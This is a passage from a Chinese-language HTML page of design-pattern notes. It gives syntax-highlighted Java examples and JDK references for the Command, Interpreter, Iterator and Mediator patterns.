slot<span class="token punctuation">)</span> <span class="token punctuation">{</span>        onCommands<span class="token punctuation">[</span>slot<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">offButtonWasPushed</span><span class="token punctuation">(</span><span class="token keyword">int</span> slot<span class="token punctuation">)</span> <span class="token punctuation">{</span>        offCommands<span class="token punctuation">[</span>slot<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Invoker invoker <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Invoker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Light light <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Light</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Command lightOnCommand <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LightOnCommand</span><span class="token punctuation">(</span>light<span class="token punctuation">)</span><span class="token punctuation">;</span>        Command lightOffCommand <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LightOffCommand</span><span class="token punctuation">(</span>light<span class="token punctuation">)</span><span class="token punctuation">;</span>        invoker<span class="token punctuation">.</span><span class="token function">setOnCommand</span><span class="token punctuation">(</span>lightOnCommand<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        invoker<span class="token punctuation">.</span><span class="token function">setOffCommand</span><span class="token punctuation">(</span>lightOffCommand<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        invoker<span class="token punctuation">.</span><span class="token function">onButtonWasPushed</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        invoker<span class="token punctuation">.</span><span class="token function">offButtonWasPushed</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="JDK-6"><a href="#JDK-6" class="headerlink" title="JDK"></a>JDK</h3><ul><li><a href="http://docs.oracle.com/javase/8/docs/api/java/lang/Runnable.html" target="_blank" rel="noopener">java.lang.Runnable</a></li><li><a href="https://github.com/Netflix/Hystrix/wiki">Netflix Hystrix</a></li><li><a href="http://docs.oracle.com/javase/8/docs/api/javax/swing/Action.html" target="_blank" rel="noopener">javax.swing.Action</a></li></ul><h2 id="3-解释器（Interpreter）"><a href="#3-解释器（Interpreter）" class="headerlink" title="3. 解释器（Interpreter）"></a>3. 解释器（Interpreter）</h2><h3 id="Intent-8"><a href="#Intent-8" class="headerlink" title="Intent"></a>Intent</h3><p>为语言创建解释器，通常由语言的语法和语法分析来定义。</p><h3 id="Class-Diagram-8"><a href="#Class-Diagram-8" class="headerlink" title="Class Diagram"></a>Class Diagram</h3><ul><li>TerminalExpression：终结符表达式，每个终结符都需要一个 TerminalExpression。</li><li>Context：上下文，包含解释器之外的一些全局信息。</li></ul><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/794239e3-4baf-4aad-92df-f02f59b2a6fe.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/794239e3-4baf-4aad-92df-f02f59b2a6fe.png" alt="img"></a></p><h3 id="Implementation-8"><a href="#Implementation-8" class="headerlink" title="Implementation"></a>Implementation</h3><p>以下是一个规则检验器实现，具有 and 和 or 规则，通过规则可以构建一颗解析树，用来检验一个文本是否满足解析树定义的规则。</p><p>例如一颗解析树为 D And (A Or (B C))，文本 “D A” 满足该解析树定义的规则。</p><p>这里的 Context 指的是 String。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Expression</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">boolean</span> <span class="token function">interpret</span><span class="token punctuation">(</span>String str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TerminalExpression</span> <span class="token keyword">extends</span> <span class="token class-name">Expression</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> String literal <span class="token operator">=</span> null<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">TerminalExpression</span><span class="token punctuation">(</span>String str<span class="token punctuation">)</span> <span class="token punctuation">{</span>        literal <span class="token operator">=</span> str<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">interpret</span><span class="token punctuation">(</span>String str<span class="token punctuation">)</span> <span class="token punctuation">{</span>        StringTokenizer st <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringTokenizer</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>st<span class="token punctuation">.</span><span class="token function">hasMoreTokens</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            String test <span class="token operator">=</span> st<span class="token punctuation">.</span><span class="token function">nextToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>test<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>literal<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AndExpression</span> <span class="token keyword">extends</span> <span class="token class-name">Expression</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> Expression expression1 <span class="token operator">=</span> null<span class="token punctuation">;</span>    <span class="token keyword">private</span> Expression expression2 <span class="token operator">=</span> null<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">AndExpression</span><span class="token punctuation">(</span>Expression expression1<span class="token punctuation">,</span> Expression expression2<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>expression1 <span class="token operator">=</span> expression1<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>expression2 <span class="token operator">=</span> expression2<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">interpret</span><span class="token punctuation">(</span>String str<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> expression1<span class="token punctuation">.</span><span class="token function">interpret</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> expression2<span class="token punctuation">.</span><span class="token function">interpret</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">OrExpression</span> <span class="token keyword">extends</span> <span class="token class-name">Expression</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> Expression expression1 <span class="token operator">=</span> null<span class="token punctuation">;</span>    <span class="token keyword">private</span> Expression expression2 <span class="token operator">=</span> null<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">OrExpression</span><span class="token punctuation">(</span>Expression expression1<span class="token punctuation">,</span> Expression expression2<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>expression1 <span class="token operator">=</span> expression1<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>expression2 <span class="token operator">=</span> expression2<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">interpret</span><span class="token punctuation">(</span>String str<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> expression1<span class="token punctuation">.</span><span class="token function">interpret</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span> <span class="token operator">||</span> expression2<span class="token punctuation">.</span><span class="token function">interpret</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**     * 构建解析树     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> Expression <span class="token function">buildInterpreterTree</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Literal</span>        Expression terminal1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TerminalExpression</span><span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Expression terminal2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TerminalExpression</span><span class="token punctuation">(</span><span class="token string">"B"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Expression terminal3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TerminalExpression</span><span class="token punctuation">(</span><span class="token string">"C"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Expression terminal4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TerminalExpression</span><span class="token punctuation">(</span><span class="token string">"D"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// B C</span>        Expression alternation1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OrExpression</span><span class="token punctuation">(</span>terminal2<span class="token punctuation">,</span> terminal3<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// A Or (B C)</span>        Expression alternation2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OrExpression</span><span class="token punctuation">(</span>terminal1<span class="token punctuation">,</span> alternation1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// D And (A Or (B C))</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">AndExpression</span><span class="token punctuation">(</span>terminal4<span class="token punctuation">,</span> alternation2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Expression define <span class="token operator">=</span> <span class="token function">buildInterpreterTree</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String context1 <span class="token operator">=</span> <span class="token string">"D A"</span><span class="token punctuation">;</span>        String context2 <span class="token operator">=</span> <span class="token string">"A B"</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>define<span class="token punctuation">.</span><span class="token function">interpret</span><span class="token punctuation">(</span>context1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>define<span class="token punctuation">.</span><span class="token function">interpret</span><span class="token punctuation">(</span>context2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token boolean">true</span><span class="token boolean">false</span></code></pre><h3 id="JDK-7"><a href="#JDK-7" class="headerlink" title="JDK"></a>JDK</h3><ul><li><a href="http://docs.oracle.com/javase/8/docs/api/java/util/regex/Pattern.html" target="_blank" rel="noopener">java.util.Pattern</a></li><li><a href="http://docs.oracle.com/javase/8/docs/api/java/text/Normalizer.html" target="_blank" rel="noopener">java.text.Normalizer</a></li><li>All subclasses of <a href="http://docs.oracle.com/javase/8/docs/api/java/text/Format.html" target="_blank" rel="noopener">java.text.Format</a></li><li><a href="http://docs.oracle.com/javaee/7/api/javax/el/ELResolver.html" target="_blank" rel="noopener">javax.el.ELResolver</a></li></ul><h2 id="4-迭代器（Iterator）"><a href="#4-迭代器（Iterator）" class="headerlink" title="4. 迭代器（Iterator）"></a>4. 迭代器（Iterator）</h2><h3 id="Intent-9"><a href="#Intent-9" class="headerlink" title="Intent"></a>Intent</h3><p>提供一种顺序访问聚合对象元素的方法，并且不暴露聚合对象的内部表示。</p><h3 id="Class-Diagram-9"><a href="#Class-Diagram-9" class="headerlink" title="Class Diagram"></a>Class Diagram</h3><ul><li>Aggregate 是聚合类，其中 createIterator() 方法可以产生一个 Iterator；</li><li>Iterator 主要定义了 hasNext() 和 next() 方法。</li><li>Client 组合了 Aggregate，为了迭代遍历 Aggregate，也需要组合 Iterator。</li></ul><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/b0f61ac2-a4b6-4042-9cf0-ccf4238c1ff7.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/b0f61ac2-a4b6-4042-9cf0-ccf4238c1ff7.png" alt="img"></a></p><h3 id="Implementation-9"><a href="#Implementation-9" class="headerlink" title="Implementation"></a>Implementation</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Aggregate</span> <span class="token punctuation">{</span>    Iterator <span class="token function">createIterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConcreteAggregate</span> <span class="token keyword">implements</span> <span class="token class-name">Aggregate</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> Integer<span class="token punctuation">[</span><span class="token punctuation">]</span> items<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">ConcreteAggregate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        items <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Integer</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> items<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            items<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Iterator <span class="token function">createIterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ConcreteIterator</span><span class="token operator">&lt;</span>Integer<span class="token operator">></span><span class="token punctuation">(</span>items<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Iterator</span><span class="token operator">&lt;</span>Item<span class="token operator">></span> <span class="token punctuation">{</span>    Item <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">boolean</span> <span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConcreteIterator</span><span class="token operator">&lt;</span>Item<span class="token operator">></span> <span class="token keyword">implements</span> <span class="token class-name">Iterator</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> Item<span class="token punctuation">[</span><span class="token punctuation">]</span> items<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> position <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">ConcreteIterator</span><span class="token punctuation">(</span>Item<span class="token punctuation">[</span><span class="token punctuation">]</span> items<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>items <span class="token operator">=</span> items<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Object <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> items<span class="token punctuation">[</span>position<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> position <span class="token operator">&lt;</span> items<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Aggregate aggregate <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConcreteAggregate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Iterator<span class="token operator">&lt;</span>Integer<span class="token operator">></span> iterator <span class="token operator">=</span> aggregate<span class="token punctuation">.</span><span class="token function">createIterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>iterator<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>iterator<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="JDK-8"><a href="#JDK-8" class="headerlink" title="JDK"></a>JDK</h3><ul><li><a href="http://docs.oracle.com/javase/8/docs/api/java/util/Iterator.html" target="_blank" rel="noopener">java.util.Iterator</a></li><li><a href="http://docs.oracle.com/javase/8/docs/api/java/util/Enumeration.html" target="_blank" rel="noopener">java.util.Enumeration</a></li></ul><h2 id="5-中介者（Mediator）"><a href="#5-中介者（Mediator）" class="headerlink" title="5. 中介者（Mediator）"></a>5. 中介者（Mediator）</h2><h3 id="Intent-10"><a href="#Intent-10" class="headerlink" title="Intent"></a>Intent</h3><p>集中相关对象之间复杂的沟通和控制方式。</p><h3 id="Class-Diagram-10"><a href="#Class-Diagram-10" class="headerlink" title="Class Diagram"></a>Class Diagram</h3><ul><li>Mediator：中介者，定义一个接口用于与各同事（Colleague）对象通信。</li><li>Colleague：同事，相关对象</li></ul><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/d0afdd23-c9a5-4d1c-9b3d-404bff3bd0d1.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/d0afdd23-c9a5-4d1c-9b3d-404bff3bd0d1.png" alt="img"></a></p><h3 id="Implementation-10"><a href="#Implementation-10" class="headerlink" title="Implementation"></a>Implementation</h3><p>Alarm（闹钟）、CoffeePot（咖啡壶）、Calendar（日历）、Sprinkler（喷头）是一组相关的对象，在某个对象的事件产生时需要去操作其它对象，形成了下面这种依赖结构：</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/82cfda3b-b53b-4c89-9fdb-26dd2db0cd02.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/82cfda3b-b53b-4c89-9fdb-26dd2db0cd02.jpg" alt="img"></a></p><p>使用中介者模式可以将复杂的依赖结构变成星形结构：</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/5359cbf5-5a79-4874-9b17-f23c53c2cb80.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/5359cbf5-5a79-4874-9b17-f23c53c2cb80.jpg" alt="img"></a></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Colleague</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">void</span> <span class="token function">onEvent</span><span class="token punctuation">(</span>Mediator mediator<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Alarm</span> <span class="token keyword">extends</span> <span class="token class-name">Colleague</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onEvent</span><span class="token punctuation">(</span>Mediator mediator<span class="token punctuation">)</span> <span class="token punctuation">{</span>        mediator<span class="token punctuation">.</span><span class="token function">doEvent</span><span class="token punctuation">(</span><span class="token string">"alarm"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doAlarm</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"doAlarm()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CoffeePot</span> <span class="token keyword">extends</span> <span class="token class-name">Colleague</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onEvent</span><span class="token punctuation">(</span>Mediator mediator<span class="token punctuation">)</span> <span class="token punctuation">{</span>        mediator<span class="token punctuation">.</span><span class="token function">doEvent</span><span class="token punctuation">(</span><span class="token string">"coffeePot"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doCoffeePot</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"doCoffeePot()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Calender</span> <span class="token keyword">extends</span> <span class="token class-name">Colleague</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onEvent</span><span class="token punctuation">(</span>Mediator mediator<span class="token punctuation">)</span> <span class="token punctuation">{</span>        mediator<span class="token punctuation">.</span><span class="token function">doEvent</span><span class="token punctuation">(</span><span class="token string">"calender"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doCalender</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"doCalender()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Sprinkler</span> <span class="token keyword">extends</span> <span class="token class-name">Colleague</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onEvent</span><span class="token punctuation">(</span>Mediator mediator<span class="token punctuation">)</span> <span class="token punctuation">{</span>        mediator<span class="token punctuation">.</span><span class="token function">doEvent</span><span class="token punctuation">(</span><span class="token string">"sprinkler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doSprinkler</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"doSprinkler()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Mediator</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">void</span> <span class="token function">doEvent</span><span class="token punctuation">(</span>String eventType<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConcreteMediator</span> <span class="token keyword">extends</span> <span class="token class-name">Mediator</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> Alarm alarm<span class="token punctuation">;</span>    <span class="token keyword">private</span> CoffeePot coffeePot<span class="token punctuation">;</span>    <span class="token keyword">private</span> Calender calender<span class="token punctuation">;</span>    <span class="token keyword">private</span> Sprinkler sprinkler<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">ConcreteMediator</span><span class="token punctuation">(</span>Alarm alarm<span class="token punctuation">,</span> CoffeePot coffeePot<span class="token punctuation">,</span> Calender calender<span class="token punctuation">,</span> Sprinkler sprinkler<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>alarm <span class="token operator">=</span> alarm<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>coffeePot <span class="token operator">=</span> coffeePot<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>calender <span class="token operator">=</span> calender<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>sprinkler <span class="token operator">=</span> sprinkler<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doEvent</span><span class="token punctuation">(</span>String eventType<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span>eventType<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token string">"alarm"</span><span class="token operator">:</span>                <span class="token function">doAlarmEvent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"coffeePot"</span><span class="token operator">:</span>                <span class="token function">doCoffeePotEvent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">"calender"</span><span class="token operator">:</span>                <span class="token function">doCalenderEvent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token operator">:</span>                <span class="token function">doSprinklerEvent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doAlarmEvent</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        alarm<span class="token punctuation">.</span><span class="token function">doAlarm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        coffeePot<span class="token punctuation">.</span><span class="token function">doCoffeePot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        calender<span class="token punctuation">.</span><span class="token function">doCalender</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        sprinkler<span class="token punctuation">.</span><span class="token function">doSprinkler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doCoffeePotEvent</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// ...</span>    <span class="token punctuation">}</span>    <span class="token 